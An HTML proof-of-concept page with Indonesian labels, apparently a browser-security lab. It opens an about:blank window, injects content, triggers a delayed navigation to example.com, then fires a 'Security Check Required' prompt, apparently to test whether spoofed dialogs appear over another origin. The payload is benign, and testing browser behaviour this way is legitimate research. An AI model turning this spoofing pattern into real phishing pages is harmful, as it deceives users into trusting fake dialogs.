<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>Chromium Navigation Desync Lab</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: system-ui, -apple-system, sans-serif;
            text-align: center;
            padding: 50px 20px;
        }
        .box {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
            max-width: 400px;
            margin: 0 auto;
            border: 1px: #334155;
        }
        button {
            background-color: #ef4444;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
        }
        button:active {
            background-color: #dc2626;
        }
        .log {
            margin-top: 15px;
            font-size: 0.8rem;
            color: #94a3b8;
            font-family: monospace;
        }
    </style>
</head>
<body>

    <div class="box">
        <h2>Lab Simulasi Desync</h2>
        <p>Uji coba injeksi about:blank dan navigasi tertunda.</p>
        <button id="trigger">JALANKAN POC</button>
        <div id="log" class="log">Status: Menunggu aksi...</div>
    </div>

    <script>
        document.getElementById('trigger').addEventListener('click', function() {
            const logEl = document.getElementById('log');
            logEl.innerText = "Status: Membuka jendela baru...";

            // 1. Membuka jendela baru dengan konteks kosong (about:blank)
            let newWindow = window.open('about:blank', '_blank');

            if (!newWindow) {
                logEl.innerText = "Status Gagal: Pop-up diblokir oleh browser.";
                return;
            }

            try {
                // 2. Menyuntikkan konten kustom (Hallo) ke dalam dokumen baru
                newWindow.document.open();
                newWindow.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head><title>Injected View</title></head>
                    <body style="background:white; color:black; text-align:center; padding-top:50px; font-family:sans-serif;">
                        <h1>Hallo</h1>
                        <p>Konten uji coba terinjeksi pada about:blank</p>
                    </body>
                    </html>
                `);
                newWindow.document.close();
                logEl.innerText = "Status: Konten 'Hallo' berhasil ditulis.";

                // 3. Memicu navigasi asinkron tertunda ke target (misal: example.com)
                setTimeout(() => {
                    logEl.innerText = "Status: Memicu navigasi ke target...";
                    newWindow.location.href = "https://example.com";
                }, 300);

                // 4. Percobaan pemanggilan dialog modal untuk menguji respons thread
                setTimeout(() => {
                    try {
                        newWindow.prompt("Security Check Required", "Session Lock");
                    } catch (e) {
                        console.log("Modal dibatasi/diblokir oleh kebijakan keamanan.");
                    }
                }, 600);

            } catch (err) {
                logEl.innerText = "Status Error: " + err.message;
            }
        });
    </script>

</body>
</html>
